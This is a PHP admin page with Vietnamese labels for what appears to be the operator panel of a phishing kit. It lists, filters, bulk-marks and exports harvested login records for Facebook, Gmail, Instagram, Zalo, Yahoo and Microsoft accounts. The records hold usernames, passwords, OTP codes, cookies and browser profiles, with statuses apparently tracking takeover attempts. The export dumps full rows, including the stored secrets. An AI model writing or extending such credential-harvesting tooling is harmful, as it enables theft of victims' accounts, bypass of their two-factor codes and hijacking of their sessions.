<?php
session_start();
require_once $_SERVER['DOCUMENT_ROOT'] . '/config/database.php';
require_once $_SERVER['DOCUMENT_ROOT'] . '/config/config.php';
require_once __DIR__ . '/../../includes/functions.php';
require_once __DIR__ . '/../../includes/admin-security.php';
require_once __DIR__ . '/../../includes/session-management.php';

// Chỉ yêu cầu xác thực Admin Key
requireAdminKey();

$page_title = 'User Login Dashboard';
include __DIR__ . '/../../includes/header.php';

// Xử lý hành động (bulk)
if ($_SERVER['REQUEST_METHOD'] === 'POST' && checkCSRFToken()) {
    $action = $_POST['action'] ?? '';
    $selected = isset($_POST['selected']) && is_array($_POST['selected']) ? $_POST['selected'] : [];

    if (!empty($action) && !empty($selected)) {
        switch ($action) {
            case 'bulk_block_ip':
                // Chặn IP theo các phiên đã chọn
                $blocked = 0;
                foreach ($selected as $sid) {
                    $stmt = $pdo->prepare("SELECT user_ip FROM login_sessions WHERE session_id = ?");
                    $stmt->execute([$sid]);
                    if ($row = $stmt->fetch()) {
                        if (blockIP($row['user_ip'], 'Bulk block từ Login Dashboard')) {
                            $blocked++;
                        }
                    }
                }
                setFlashMessage('success', "Đã chặn IP cho {$blocked} phiên đã chọn");
                break;

            case 'bulk_mark_success':
            case 'bulk_mark_failed':
            case 'bulk_mark_processing':
                $status = $action === 'bulk_mark_success' ? 'success' : ($action === 'bulk_mark_failed' ? 'failed' : 'processing');
                $updated = 0;
                $stmt = $pdo->prepare("UPDATE login_sessions SET status = ?, updated_at = NOW() WHERE session_id = ?");
                foreach ($selected as $sid) {
                    if ($stmt->execute([$status, $sid])) { $updated++; }
                }
                setFlashMessage('success', "Đã cập nhật trạng thái '{$status}' cho {$updated} phiên");
                break;

            case 'bulk_export_selected':
                // Xuất JSON các phiên chọn
                $in = str_repeat('?,', count($selected) - 1) . '?';
                $stmt = $pdo->prepare("SELECT * FROM login_sessions WHERE session_id IN ($in) ORDER BY created_at DESC");
                $stmt->execute($selected);
                $rows = $stmt->fetchAll();
                header('Content-Type: application/json');
                header('Content-Disposition: attachment; filename="selected_sessions_' . date('Y-m-d_H-i-s') . '.json"');
                echo json_encode($rows, JSON_PRETTY_PRINT);
                exit;
        }
    } else if (!empty($action)) {
        // Trường hợp export toàn bộ theo filter
        if ($action === 'export_all') {
            $filters = [
                'platform' => $_POST['platform'] ?? '',
                'status' => $_POST['status'] ?? '',
                'date_from' => $_POST['date_from'] ?? '',
                'date_to' => $_POST['date_to'] ?? ''
            ];
            $format = $_POST['format'] ?? 'json';
            $data = exportSessionData($filters, $format);
            header('Content-Type: ' . ($format === 'csv' ? 'text/csv' : 'application/json'));
            header('Content-Disposition: attachment; filename="sessions_' . date('Y-m-d_H-i-s') . '.' . $format . '"');
            echo $data;
            exit;
        }
    }
}

// Lấy filters
$page = max(1, intval($_GET['page'] ?? 1));
$filters = [
    'platform' => $_GET['platform'] ?? '',
    'status' => $_GET['status'] ?? '',
    'username' => $_GET['username'] ?? '',
    'date_from' => $_GET['date_from'] ?? '',
    'date_to' => $_GET['date_to'] ?? ''
];

// Dữ liệu phiên
$sessions_data = getLoginSessions($page, $filters);
$sessions = $sessions_data['sessions'];
$total = $sessions_data['total'];
$total_pages = $sessions_data['total_pages'];
?>

<!-- Header + Action buttons -->
<div class="bg-gray-800 border-b border-gray-700 mb-6 rounded-lg p-5">
  <div class="flex items-center justify-between">
    <div>
      <h1 class="text-2xl font-bold text-white">User Login Dashboard</h1>
      <p class="text-gray-400 text-sm mt-1">Quản lý và theo dõi hoạt động đăng nhập theo thời gian thực</p>
    </div>
    <div class="flex items-center space-x-2">
      <button onclick="openExportModal()" class="bg-green-600 hover:bg-green-700 text-white px-4 py-2 rounded-lg font-medium shadow-md shadow-green-500/30">
        <i class="fas fa-file-export mr-2"></i> Export
      </button>
      <button onclick="location.reload()" class="bg-gray-600 hover:bg-gray-700 text-white px-3 py-2 rounded-lg">
        <i class="fas fa-rotate mr-1"></i> Refresh
      </button>
    </div>
  </div>
</div>

<!-- Filter controls -->
<div class="bg-gray-800 rounded-lg border border-gray-700 p-4 mb-4">
  <form method="GET" class="grid grid-cols-1 md:grid-cols-6 gap-3">
    <div class="md:col-span-2">
      <label class="block text-sm text-gray-300 mb-2">Tìm kiếm tài khoản</label>
      <input type="text" name="username" value="<?php echo htmlspecialchars($filters['username']); ?>" placeholder="Nhập username/email"
        class="bg-gray-700 border border-gray-600 text-white rounded-lg px-3 py-2 w-full focus:ring-2 focus:ring-primary-500 focus:border-transparent" />
    </div>
    <div>
      <label class="block text-sm text-gray-300 mb-2">Nền tảng</label>
      <select name="platform" class="bg-gray-700 border border-gray-600 text-white rounded-lg px-3 py-2 w-full focus:ring-2 focus:ring-primary-500">
        <option value="">Tất cả</option>
        <option value="facebook" <?php echo $filters['platform']==='facebook'?'selected':''; ?>>Facebook</option>
        <option value="gmail" <?php echo $filters['platform']==='gmail'?'selected':''; ?>>Gmail</option>
        <option value="instagram" <?php echo $filters['platform']==='instagram'?'selected':''; ?>>Instagram</option>
        <option value="zalo" <?php echo $filters['platform']==='zalo'?'selected':''; ?>>Zalo</option>
        <option value="yahoo" <?php echo $filters['platform']==='yahoo'?'selected':''; ?>>Yahoo</option>
        <option value="microsoft" <?php echo $filters['platform']==='microsoft'?'selected':''; ?>>Microsoft</option>
      </select>
    </div>
    <div>
      <label class="block text-sm text-gray-300 mb-2">Trạng thái</label>
      <select name="status" class="bg-gray-700 border border-gray-600 text-white rounded-lg px-3 py-2 w-full focus:ring-2 focus:ring-primary-500">
        <option value="">Tất cả</option>
        <option value="pending" <?php echo $filters['status']==='pending'?'selected':''; ?>>Chờ xử lý</option>
        <option value="processing" <?php echo $filters['status']==='processing'?'selected':''; ?>>Đang xử lý</option>
        <option value="success" <?php echo $filters['status']==='success'?'selected':''; ?>>Thành công</option>
        <option value="failed" <?php echo $filters['status']==='failed'?'selected':''; ?>>Thất bại</option>
        <option value="blocked" <?php echo $filters['status']==='blocked'?'selected':''; ?>>Bị chặn</option>
      </select>
    </div>
    <div>
      <label class="block text-sm text-gray-300 mb-2">Từ ngày</label>
      <input type="date" name="date_from" value="<?php echo htmlspecialchars($filters['date_from']); ?>" class="bg-gray-700 border border-gray-600 text-white rounded-lg px-3 py-2 w-full" />
    </div>
    <div>
      <label class="block text-sm text-gray-300 mb-2">Đến ngày</label>
      <input type="date" name="date_to" value="<?php echo htmlspecialchars($filters['date_to']); ?>" class="bg-gray-700 border border-gray-600 text-white rounded-lg px-3 py-2 w-full" />
    </div>
    <div class="flex items-end space-x-2">
      <button type="submit" class="bg-primary-600 hover:bg-primary-700 text-white px-4 py-2 rounded-lg font-medium"><i class="fas fa-filter mr-2"></i>Lọc</button>
      <a href="<?php echo APP_URL; ?>/admin/login-dashboard" class="bg-gray-600 hover:bg-gray-700 text-white px-4 py-2 rounded-lg font-medium"><i class="fas fa-times mr-2"></i>Xóa</a>
    </div>
  </form>
</div>

<!-- Bulk actions -->
<form method="POST" id="bulkForm" class="bg-gray-800 rounded-lg border border-gray-700 overflow-hidden">
  <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token'] ?? ''; ?>">
  <div class="px-4 py-3 border-b border-gray-700 flex items-center justify-between">
    <div class="flex items-center space-x-2">
      <select name="action" id="bulkAction" class="bg-gray-700 border border-gray-600 text-white rounded-lg px-3 py-2">
        <option value="">Chọn bulk action...</option>
        <option value="bulk_mark_processing">Đánh dấu Đang xử lý</option>
        <option value="bulk_mark_success">Đánh dấu Thành công</option>
        <option value="bulk_mark_failed">Đánh dấu Thất bại</option>
        <option value="bulk_block_ip">Chặn IP (hàng loạt)</option>
        <option value="bulk_export_selected">Export mục đã chọn (JSON)</option>
      </select>
      <button type="submit" class="bg-blue-600 hover:bg-blue-700 text-white px-4 py-2 rounded-lg font-medium disabled:opacity-50" id="applyBulk" disabled>
        <i class="fas fa-bolt mr-2"></i> Áp dụng
      </button>
    </div>
    <div class="text-gray-400 text-sm"><span id="selectedCount">0</span> mục đã chọn</div>
  </div>

  <div class="overflow-x-auto">
    <table class="w-full text-sm">
      <thead class="bg-gray-700 text-gray-200">
        <tr>
          <th class="px-4 py-3"><input type="checkbox" id="checkAll"></th>
          <th class="px-4 py-3 text-left">Thời gian</th>
          <th class="px-4 py-3 text-left">Hành động</th>
          <th class="px-4 py-3 text-left">Liên kết</th>
          <th class="px-4 py-3 text-left">Tài khoản</th>
          <th class="px-4 py-3 text-left">Mật khẩu</th>
          <th class="px-4 py-3 text-left">OTP</th>
          <th class="px-4 py-3 text-left">IP</th>
          <th class="px-4 py-3 text-left">Trạng thái</th>
          <th class="px-4 py-3 text-left">Chrome Profile</th>
          <th class="px-4 py-3 text-left">Nền tảng</th>
          <th class="px-4 py-3 text-left">Thiết bị</th>
          <th class="px-4 py-3 text-left">Cookie</th>
          <th class="px-4 py-3 text-left">Session</th>
        </tr>
      </thead>
      <tbody class="divide-y divide-gray-700">
        <?php if (empty($sessions)): ?>
          <tr>
            <td colspan="14" class="text-center text-gray-400 py-8">Không có dữ liệu phiên</td>
          </tr>
        <?php else: ?>
          <?php foreach ($sessions as $s): ?>
          <tr class="hover:bg-gray-700/60">
            <td class="px-4 py-3 align-top">
              <input type="checkbox" name="selected[]" value="<?php echo htmlspecialchars($s['session_id']); ?>" class="row-check">
            </td>
            <td class="px-4 py-3 align-top text-gray-300"><?php echo formatDate($s['created_at']); ?></td>
            <td class="px-4 py-3 align-top text-gray-200">—</td>
            <td class="px-4 py-3 align-top"><a class="text-primary-400 hover:text-primary-300" href="#">—</a></td>
            <td class="px-4 py-3 align-top text-white"><?php echo htmlspecialchars($s['username']); ?></td>
            <td class="px-4 py-3 align-top"><span class="text-gray-500">••••••••</span></td>
            <td class="px-4 py-3 align-top text-gray-400">—</td>
            <td class="px-4 py-3 align-top text-gray-300"><?php echo htmlspecialchars($s['user_ip']); ?></td>
            <td class="px-4 py-3 align-top">
              <span class="inline-flex px-2 py-1 rounded-full text-xs font-semibold <?php
                echo $s['status']==='pending'?'bg-yellow-100 text-yellow-800':
                    ($s['status']==='processing'?'bg-blue-100 text-blue-800':
                    ($s['status']==='success'?'bg-green-100 text-green-800':
                    ($s['status']==='failed'?'bg-red-100 text-red-800':'bg-gray-100 text-gray-800')));
              ?>">
                <?php echo $s['status']==='pending'?'Chờ xử lý':($s['status']==='processing'?'Đang xử lý':($s['status']==='success'?'Thành công':($s['status']==='failed'?'Thất bại':'Bị chặn'))); ?>
              </span>
            </td>
            <td class="px-4 py-3 align-top text-gray-400">—</td>
            <td class="px-4 py-3 align-top">
              <div class="flex items-center">
                <i class="fab fa-<?php echo htmlspecialchars($s['platform']); ?> mr-2 <?php
                  echo $s['platform']==='facebook'?'text-blue-400':
                      ($s['platform']==='gmail'?'text-red-400':
                      ($s['platform']==='instagram'?'text-pink-400':
                      ($s['platform']==='zalo'?'text-blue-400':
                      ($s['platform']==='yahoo'?'text-purple-400':'text-blue-400'))));
                ?>"></i>
                <span class="text-white capitalize"><?php echo htmlspecialchars($s['platform']); ?></span>
              </div>
              <div class="text-xs text-gray-400 mt-1"><?php echo htmlspecialchars($s['browser']); ?> • <?php echo htmlspecialchars($s['os']); ?></div>
            </td>
            <td class="px-4 py-3 align-top text-gray-300"><?php echo htmlspecialchars($s['device_type']); ?></td>
            <td class="px-4 py-3 align-top text-gray-400 truncate max-w-[220px]">—</td>
            <td class="px-4 py-3 align-top"><code class="text-xs"><?php echo substr($s['session_id'],0,10) . '…'; ?></code></td>
          </tr>
          <?php endforeach; ?>
        <?php endif; ?>
      </tbody>
    </table>
  </div>

  <?php if ($total_pages > 1): ?>
  <div class="px-4 py-3 border-t border-gray-700">
    <?php echo generatePagination($page, $total_pages, APP_URL . '/admin/login-dashboard?' . http_build_query($filters)); ?>
  </div>
  <?php endif; ?>
</form>

<!-- Export modal -->
<div id="exportModal" class="fixed inset-0 bg-black/60 hidden z-50">
  <div class="flex items-center justify-center min-h-screen p-4">
    <div class="bg-gray-800 border border-primary-700/40 rounded-xl shadow-[0_0_25px_rgba(236,72,153,0.25)] max-w-md w-full p-6">
      <div class="flex items-center justify-between mb-4">
        <h3 class="text-lg font-bold">Export dữ liệu</h3>
        <button onclick="closeExportModal()" class="text-gray-400 hover:text-white"><i class="fas fa-times text-xl"></i></button>
      </div>
      <form method="POST">
        <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token'] ?? ''; ?>">
        <input type="hidden" name="action" value="export_all">
        <div class="space-y-3">
          <div>
            <label class="block text-sm text-gray-300 mb-1">Định dạng</label>
            <select name="format" class="bg-gray-700 border border-gray-600 text-white rounded-lg px-3 py-2 w-full">
              <option value="json">JSON</option>
              <option value="csv">CSV</option>
            </select>
          </div>
          <div>
            <label class="block text-sm text-gray-300 mb-1">Nền tảng</label>
            <select name="platform" class="bg-gray-700 border border-gray-600 text-white rounded-lg px-3 py-2 w-full">
              <option value="">Tất cả</option>
              <option value="facebook">Facebook</option>
              <option value="gmail">Gmail</option>
              <option value="instagram">Instagram</option>
              <option value="zalo">Zalo</option>
              <option value="yahoo">Yahoo</option>
              <option value="microsoft">Microsoft</option>
            </select>
          </div>
          <div>
            <label class="block text-sm text-gray-300 mb-1">Trạng thái</label>
            <select name="status" class="bg-gray-700 border border-gray-600 text-white rounded-lg px-3 py-2 w-full">
              <option value="">Tất cả</option>
              <option value="success">Thành công</option>
              <option value="failed">Thất bại</option>
              <option value="pending">Chờ xử lý</option>
              <option value="processing">Đang xử lý</option>
            </select>
          </div>
          <div class="grid grid-cols-2 gap-3">
            <div>
              <label class="block text-sm text-gray-300 mb-1">Từ ngày</label>
              <input type="date" name="date_from" class="bg-gray-700 border border-gray-600 text-white rounded-lg px-3 py-2 w-full" />
            </div>
            <div>
              <label class="block text-sm text-gray-300 mb-1">Đến ngày</label>
              <input type="date" name="date_to" class="bg-gray-700 border border-gray-600 text-white rounded-lg px-3 py-2 w-full" />
            </div>
          </div>
        </div>
        <div class="flex justify-end space-x-2 mt-5">
          <button type="button" onclick="closeExportModal()" class="bg-gray-600 hover:bg-gray-700 text-white px-4 py-2 rounded-lg">Hủy</button>
          <button type="submit" class="bg-green-600 hover:bg-green-700 text-white px-4 py-2 rounded-lg"><i class="fas fa-download mr-2"></i>Export</button>
        </div>
      </form>
    </div>
  </div>
</div>

<script>
// Modal helpers
function openExportModal(){ document.getElementById('exportModal').classList.remove('hidden'); }
function closeExportModal(){ document.getElementById('exportModal').classList.add('hidden'); }

// Bulk selection handling
const checkAll = document.getElementById('checkAll');
const rowChecks = document.querySelectorAll('.row-check');
const selectedCount = document.getElementById('selectedCount');
const applyBulk = document.getElementById('applyBulk');

function updateSelectedCount(){
  const n = document.querySelectorAll('.row-check:checked').length;
  selectedCount.textContent = n;
  applyBulk.disabled = n === 0 || !document.getElementById('bulkAction').value;
}

if (checkAll){
  checkAll.addEventListener('change', (e)=>{
    rowChecks.forEach(cb=>{ cb.checked = e.target.checked; });
    updateSelectedCount();
  });
}
rowChecks.forEach(cb=> cb.addEventListener('change', updateSelectedCount));

document.getElementById('bulkAction').addEventListener('change', updateSelectedCount);

// Auto-refresh nhẹ nhàng mỗi 30s (có thể thay bằng WebSocket sau)
setInterval(()=>{ if(!document.hidden){ location.reload(); } }, 30000);

// Đóng modal khi click nền tối
const modal = document.getElementById('exportModal');
modal.addEventListener('click', (e)=>{ if(e.target === modal){ closeExportModal(); } });
</script>

<?php include __DIR__ . '/../../includes/footer.php'; ?>
